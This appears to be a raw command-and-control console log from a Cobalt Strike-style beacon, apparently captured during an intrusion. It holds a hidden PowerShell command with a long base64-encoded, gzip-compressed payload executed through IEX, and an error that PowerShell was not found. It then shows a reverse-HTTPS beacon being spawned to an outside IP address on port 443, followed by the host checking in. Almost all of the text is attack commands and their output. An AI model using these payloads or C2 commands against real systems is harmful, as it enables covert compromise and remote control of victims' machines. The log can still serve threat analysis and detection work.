gBvAGcASQA2ADgAMQAwAEYAbQBaAGQAVQBVAGIAKwB6AE8AdAB1ADUAYgBCAEYAegA5AFYARABIAFUAaQBHAGEAcQBwAEMAUABwACsANQBOAHUAaQBaAFUAVwBhAHMAaABZAHMAdABqAGYAQQAvAHUAWQBSADYAegBqADAAbgBpAGUAcgBLAFkAdQBwAHgARwB6AEgAUAB1AFMAegB0AHAAbgBGAHkAVQBZADcAcwBEAEcARwB1AEcATQBqAHUAVgA4ADMAcABTADcATABrACsAUwBwAHMANABmAFkAbAB1AEYAbgB3AHUAKwBPAHkAUQBvAGcAQQAzAEgAdQBRAEwANwBrAHEAVQBNADcAVABDADUANgBkAHEAVQA0ADAANgBmAEUAbQBrAFMAOQBiAG8ASgBiAC8AYwBYAEcAMwBoAG4AMwBxAEoAbgBTAFgAcgBSAFAASQBDADYAUABMAFMAMQAxAG0AKwBuAFIANwBlADUANQBVACsANgA0AGUAagBmAFgANABJAHkAeQBwAFQAYgBWAGIAUwBpADMAdgBoAFoAbABkAFIAbABSADYASgBSAHkAMQBuADMAOABnADQAUAB4AGwAcQBUAGMAZQAzAEcARQBrAGcAaQBsAG0ATwAxAC8AKwBWAEsAVQB6ADYAdgAzAFQAeQA4ADMAKwBlAHUAbAA1AFgAeABmADMAeQA1AHkATQBOAGUAOAB1ADcANwA2AGQAdQBrAHQAZABzADYASABDAHYAdQByAFQAawA1AHoAYQBMAEoAMgBDAEYAUgBlADYATQBZAHUAYgA2AGsAUwBVAGUAWABjAFUAdwAwAGoAegBEAFQASwA1AGMALwAvAEQAZgBBAFIARABSAEcAQgBGAGgAbQBhADYATQBzAEwASgBCAEEAUwB1AGEAdwBMAC8ARQBVADcAOQB1AGYANwBHAHcARQB2AHIAUQBYAFQAWgB1AFAAVABXAGUAWAA3AFkAMQBLAHAAWABKADcASgBSAGIAWgBjAEYAcQAzAFMAKwBZAGkAWABqAHYASAA3AHMAegBPAEgAOAAxAFUALwBFAEQAbABBADQAUwBwAGQAVgB6AGsAKwBiAC8ASQA4AHoAOABZAFcARAA5AFoAKwBuAHgAZwB4AGkAZwAvAGwAZAAzAHQAVgAxAGkAdAArAGcAUABMAFIARgBTAGwAYwB2AFQAZAAzAE4AQQBzAEQAOQBIACsAOABnAHgAKwA4AC8AbgBkADIARwBYADkARgB2AC8AbQBkAHYAUQBMAFIANQA1AFMAeABCAC8AeABmAGwAVABJAEYAMgBBADgATwBBAEEAQQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
+12/21 19:40:08 UTC [task] <T1059> Tasked beacon to run: powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAWABhAFcALwBpAFMAaABiADkAbgBQAHcASwBmADQAZwBFAHEAQQBrAHkAUwAwAGoAeQBSAGkAMAA5ADQANABVAFkAcwBBAE0AMgBOAGsAdABlAEYAQgBtADcAZwBNAEwAbABoAGIASQBOAGgAagBmADkAMwArAGUAVwBnAFgAUgA2AE8AagAzAFQAMABrAHcAawBWAEkAdgB2AGMAdQByAFUAdgBiAGQAdQBUAEoAVABlAG0AaQBuAEYAYgBxAHAARgBIAHUASgB1AGIAVQBRAFQASABJAFYAYwA0AC8AcAA2AG0AWQBWAHUAeQB1AFoAcwA4AHIAWgBDADYAVgB0AE0ASQAvAGYATgA4AFQAeQBLAGsAbwBUADcAKwAvAHAAcQA2AEYAQQBuADQATQBvADMATwA0AGUAKwBCAFoARwBYAEUAVgBUAGwAaQBnAFUAVABSAEYANQBHAFUAZQBYAHEANgB2AHEAcQAyAE0AcgBDAHgARgBtAGkAdAA5AEIASgA4AFEANgA5AEIAUwBoAGQAUgAxADcAQwBmAGUAWABLAEwAMABJAGMAUwAxAEgAZwA0AFAARAAxAGoAegAvAEUAagBGAEkAVQBwAHEAZAAxAHIAWQB0AFMASQBVAGwAUQBzAEMAQQBZAEoAZQBVAEsAOQAwADkAdQBzAGsAWQBVADMAVAA0AHYATgBzAGgATgB1AGIAKwA1AG0ANwBkAGEAbAAwAFEATABoADUAegBGAEQAcQBMAGoAcgB1AEUAVQBRAHUAaQB4AGIANABQAEkAZABkAGcASgBhAG0AWgBNAGMARgBvAHUALwBmAFYAWABxAGYASgB5AFcAMwArAHQAeQBkAHYATQBJAFUAbQA1AFoAQgA2AFMARgBBAFUAMQBqADUAQgBTAGgAZgB0AFcAWQBRADcASABoAHgAaQBWAFMAeABwADIAYQBaAFIARQB5ADcAUQAyAHcAVwBHAHoAVQBiAE0ASwA5AEgAbwBCAFgAagB0AGgATAAxAFgATwBKADEAdgBGAEQAcAB6AGoAMQA0AGQAawBWAGsAOAA2ADUAUgBKAE0AaAA4AEMATgBjAE8ASwB3AFYATwBWAGUAbQBMACsAWAAxADEAZgB1AHoAMwBjADAAUgBoAGEAbQBPAEUAQQAxAE4AVQB3AFIAagBXAEkAVAAwAFIAMQAyAFUAVgBKADcAYwBrAEsAUABJAEEATQB0AFEAYQAyAFUAdwBKADIARgBxADEASQBGAFEARgBDAFUAWgBqAFQAawBMAGwAaABBAGIAeABmADUAcQBIAHcAVABaAG8AUgBVAHcAZQA3AEwANwA5AHAAOQBMAGUAdABvAGYAeQBIADMAZAA1AFgASwBIADUAVgBBAGEAcABqAFMAUwB2AFUAYwBFADcAOQBEAGgAMQBiAEUAegBjAGsAYwBIAE8AYwBuADkAQgArAEMAcQB3AEoALwBQAHcAVgBZADUAZgByAGIAWgA2AEgAcQBJAFkASgBXAFQAbwByAGUAVQB1AEQAMwBRADYAeABlAFgAMQAyADkARgBGAE0ARQA1AHkAawBQAG8AdwBRAFgAZQBsADgANQB2AHMAcABwAEEATQBKAEoASQAzAHAAZwAxAHoAbQBtAEcAYQBxADgAZgByACsAZgBrADkAdQBMAFoAbABMADkAcABhAEgANgBSAGUAdQBzAGMANwBxAGUARQA0ADYAdgAzAEkAcwBkAFkAZQAvADEAKwBxAHAAeQBmAFkANABlAHQAdgArADIAeQBEAEQAeABFAEcAWABmAGYANQAwAE4ARQBsAHIAaQBFAEUAbQBIADAAQQBtAHcAZQB3AG4ANAA4AG0AZAAzAGgAcABZAEUARgBYAHoAVQBMAG0ASQA2ADQAQwB5AFgAegBoACsAUQBKADUAMwBaAEsAVABGAEMAWAAzADUAVwBrAHcATwBjAHYAdQB0ADIAVAB1AEEARQBGACsANAA5AEEAVgBRAFEARQBwAFUAZgB3AFoAegB1AHMARgB4AFMAUQB3ADAARgB3AE4AOQBwAEQAVwBGADYAcwA0AFEAMABRAHgAZgBwAGMAMgBvAGQATAB0ADcAWgBtAHMAVwB5AFMASgB3AGsAcQBYAEwARABEAFAATABjAHIAWABJAG0AYwBnAGoAeQBxAHAAdwBRAEoAdgBqADgAUwBjAGoAUwBxAEoAaQBXAHYAcwBQAFYATQBwAEoAaQAxADAAbgBTAGkANwBuAFgAeQBpAGUAVQBuAGwAMgBMAFUAUQBnAFoAawA3AGwAdwB1ADAARABEADIASQB5AFIAaQB4ADMAQwBXAEsAbAB5AFQAOQBoAEQAbgBZAE8ASgBWAHgAYwBJAHAAVQA4ADUARQBSADEAQwBJAE8AWABBADAAZwA3AHUAQgBIAFkAWQBGADIAYgBLAFkAbwBaADYAMQBYACsAUABqADAAcgBOAFIASwBrAGEAeABBAFEARgBJAEYAMQBVAEkAWQBVADQASwA2AGcANQA1ADQAdwBxAHcAcwAxAFoASQBhAC8AMABIADIAQgBmADgAdQBTAFUARgBJAHkAcgBDADAAawBmAFEARQBNAEEAbQBDAFIASwBxADUAeQBOAGEAUQBwADEAcgBWAFQAOQBLAGYARAArAE4AMwBnAC8AbABwAGcAZgBZAEkAbwBVAG4AUwArAHkAWABDAFMAaQB1AG8AUwBDAGYAcQBvAEMAdwBFADYAQwBqADEAQwBNADAAWgBaADcAcQBMAEEAVQBmAE8AawBjAFUAcABaAEwAaABSAG0AWABQAFQAZABmADMANABrAHUAYQBLAFUAcABLAEMAawAwAEMAagBwAE8AZwB0AG8AdABzADYAaAB4ADUAVgBLAHoAawBhADMAeQB4ACsARwBnAGYAZABBADIAYQBxAE4AMwBtAEkAVgA2ADcAbwBZADIAbABYAGQASwAxADIAbQB2ADgAMQBFAGoAaQA5AHgAeABTAHIAZABQAHMAZwBSAHIAdwAyADAAawBDAGUAbQBTAGUATABFAGUAYgBKADEAOABzAE4AbgBrAGoAKwBMADAASQBBACsARgB4AGcAQwAzADgAUgAxAFcAcwAwAEgAbgBHAEMAcgBZAEQAVQBCAHYAOQBCAHoATgBqAEUAZQBxADcAbgBRAGwASQBzAGwAOQBYADEAUQBtAGwAbwBNADMAMgA4AEoAWABGAHIAVABxAG4AdQB3AGMAQgBrAGUAMwB2AGEAYgBQAEQAUgBUAE4AOQB2AHAAVwAzAFEAMABGAGIANwBKAHoAMgAwAEUALwBVAHQAbwBwADYATgBxAFoAbgBNAFYAVQB6AHAANgBIAHMAMgB5AHcASABRAFEAcQBiAHEAMQAzAGsAcAAzADIAZABtAHIAMwA0AGEAbgBmAG0ARABrAFAAWgBIAEcAUABDAG4AMQB2AHkAMwB6AE4AdABxAHUAZAB3ADkAYgBIAFIANwBiAEcAVwB4AEYAUgA1AG0AYwBHADcASwBOAG0AdgBZADAAbQB2AGYAdABaAEcARwBNADAAeQBWAGIASAB2AFkANQBkADcAeQBpAGgAUgBnAC8AMgBzADAAaAB6ADQANgBTAHAASAA5ADIAbAA3ADIAKwBjAHUARwA2AFoAZgByADAALwB0AHUAWgBUADQASwBiAHUAYgBLAG0AeQBhAEYATgB6AEYAcABPAGQATABWAGgAKwBjAHoAaQBuAEIAYgBhAGQAQQBoAGgAMQBoAGgATwA3AGoAZAA1AHgARgB2AHQAegB6ADkANwBLAHoAZQBHAGkAbgA0AGgAdwAxAGkAYQBoADIANgB5AEgAZwA3AHMAVgBWAGcAOQBuAHUAYQBCADMATQBNADAATwBqAFAAMgA1ADEAOQA4ACsAMwBIAG4ASAB4AGsARwBKAFcAMAA2AGIAWQB1AEEAMQBCADEALwAzAGoARwBQAFgAUwBqAFkAeQBlAGcANwBkAHEAWQBJAEQAZAA5ADIAUQBqAEkAMwA3AEcARwBUAGIATwA4AEQAZQBlAHQASgA3AC8AVwBsAE8AdAAyAGwALwBQAG0AUgArAGUASAA5AGoAdAByAFUAUgArAE4AaAB1AEUAeAAxAEQAOQBkAGoAQQBIAEEAZgAyAG4ATwB5AGMAYQBhAEgASAB3ACsALwBMAGgAUABxAHQAeAA2AFAAYgAxAEgATwBHAEoAWABjAG4ALwBiAG0ARQByAGYAdQBKAGYAbQB6AEUAbQBaAGIARQB0AE0AVgB3ADAAdQBiAHoAUABvAG4AYgBEAHoAQQBmAHEAcgA1AEcAbgAxAFMAcwBiAFEANwB0AEoAOQBEAGIAYQA2AGIAZABtAHgAaABFAGMAYQBTADEAbwBNAHMAQwBiADAAaAAyAFoAMgBqADYATABYADMAcwB4ADcAcABrAGsAWgBIADYAaABkAGcAdABxAHoAbgBKADYAcgBQAEcAUQBaAHUASABOAE4ALwBGAG0AcwBmAHoAcgBUAHQAcAB0AFIAdgBFAGgANQBZAG8ARwA1AGwAegBuADYAaQB4ADAANwBNADEAdAArADYAdQBCAFIAcgAyAC8AVABSAGUAdAB3AEkAegBIADMAdQBTADYARABSAFYAWABsAGEAQgBkADIARQBrAHoAOABkADIANwBrAHMAMgBQADEALwBZACsAMwB4AGcAOAAzAGQARABpAGUAKwBOAEwAZgA2AHgAUAA1AEoANwBVADkAUABQAGQAVQBsAEoAaQAzADEAUgBTAFoALwBIACsAMABmAFIAcQB1AHUAQQBwAHkAUABhAGYASwB5AE4AUgAvAGwAaQA3AEQALwBNAHIASABWAHIATABCAG4AUgBVAEIAegB0AGUAMQAxAEYAUgBmAEsAZQBYAHcAdwB3AHcAUwBPADUAMAA3AFgAcQA3AHYATwBDADcAKwBtAEcATQBoAGMATgBlAFQAWQBYACsATABrAHUAaABmAE8AOQBCAE8ATgBaAGQAZwBLAHkAdQBlAEgAYgBYAGMAdQBhAEcAOQAyAFIAUAByAEQAcgAzAHIAZwA3ADIAbQBzAGoATwBYADgAeQBWAHYAVwBlAFIAZQBaAGQAeQA0ADUAMABXAEQAOQBMAFkAaQB1AGUAKwBSADMAQgBJAFAAcABVAEMAdQBaAHMANwB3AGwAaQBTAFEAWQA5AGUAVwBMAEYAWQAyAG0AdgBQADQARwB0ADQAWQBoADQAWABiAEQAYgBzAE8AUwA1AEkAUQBVADkAMgBmAEQAcgBVADUARABKAHgAZwByAHAAagAvAGwASABVAGUAcgBNAGQASABtAHYARABUAHcANQAxAGcAMAArAHQAeQB4AEIAVAB6ADIAZwBYADEANwB4ADQANgA2AGcAOAA2AGIAUABqADIAUgBqAEoAVQAzAHkAeABCAFoAWABPAG0AYgBuAE4AawBLAEEATgAxAG4AMwA3AGYAMQArAEkAbgBkAFUAWABUAFkAcwBTAFcAeQBzAHEAZABlADQAMgA0AEYAZgA0AEcAWABkAEYAUgBvAGcASQA2ADgAMQAwAEYAbQBaAGQAVQBVAGIAKwB6AE8AdAB1ADUAYgBCAEYAegA5AFYARABIAFUAaQBHAGEAcQBwAEMAUABwACsANQBOAHUAaQBaAFUAVwBhAHMAaABZAHMAdABqAGYAQQAvAHUAWQBSADYAegBqADAAbgBpAGUAcgBLAFkAdQBwAHgARwB6AEgAUAB1AFMAegB0AHAAbgBGAHkAVQBZADcAcwBEAEcARwB1AEcATQBqAHUAVgA4ADMAcABTADcATABrACsAUwBwAHMANABmAFkAbAB1AEYAbgB3AHUAKwBPAHkAUQBvAGcAQQAzAEgAdQBRAEwANwBrAHEAVQBNADcAVABDADUANgBkAHEAVQA0ADAANgBmAEUAbQBrAFMAOQBiAG8ASgBiAC8AYwBYAEcAMwBoAG4AMwBxAEoAbgBTAFgAcgBSAFAASQBDADYAUABMAFMAMQAxAG0AKwBuAFIANwBlADUANQBVACsANgA0AGUAagBmAFgANABJAHkAeQBwAFQAYgBWAGIAUwBpADMAdgBoAFoAbABkAFIAbABSADYASgBSAHkAMQBuADMAOABnADQAUAB4AGwAcQBUAGMAZQAzAEcARQBrAGcAaQBsAG0ATwAxAC8AKwBWAEsAVQB6ADYAdgAzAFQAeQA4ADMAKwBlAHUAbAA1AFgAeABmADMAeQA1AHkATQBOAGUAOAB1ADcANwA2AGQAdQBrAHQAZABzADYASABDAHYAdQByAFQAawA1AHoAYQBMAEoAMgBDAEYAUgBlADYATQBZAHUAYgA2AGsAUwBVAGUAWABjAFUAdwAwAGoAegBEAFQASwA1AGMALwAvAEQAZgBBAFIARABSAEcAQgBGAGgAbQBhADYATQBzAEwASgBCAEEAUwB1AGEAdwBMAC8ARQBVADcAOQB1AGYANwBHAHcARQB2AHIAUQBYAFQAWgB1AFAAVABXAGUAWAA3AFkAMQBLAHAAWABKADcASgBSAGIAWgBjAEYAcQAzAFMAKwBZAGkAWABqAHYASAA3AHMAegBPAEgAOAAxAFUALwBFAEQAbABBADQAUwBwAGQAVgB6AGsAKwBiAC8ASQA4AHoAOABZAFcARAA5AFoAKwBuAHgAZwB4AGkAZwAvAGwAZAAzAHQAVgAxAGkAdAArAGcAUABMAFIARgBTAGwAYwB2AFQAZAAzAE4AQQBzAEQAOQBIACsAOABnAHgAKwA4AC8AbgBkADIARwBYADkARgB2AC8AbQBkAHYAUQBMAFIANQA1AFMAeABCAC8AeABmAGwAVABJAEYAMgBBADgATwBBAEEAQQA9ACIAKQApADsASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAJABzACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsA
+12/21 19:40:08 UTC [checkin] host called home, sent: 7561 bytes
+12/21 19:40:08 UTC [output]
+received output:
+'powershell' 不是内部或外部命令，也不是可运行的程序
+或批处理文件。
+
+
+12/21 19:41:41 UTC [input] <s09> spawn 8.138.82.105
+12/21 19:41:44 UTC [task] <T1093> Tasked beacon to spawn (x64) windows/beacon_https/reverse_https (8.138.82.105:443)
+12/21 19:41:52 UTC [checkin] host called home, sent: 261649 bytes
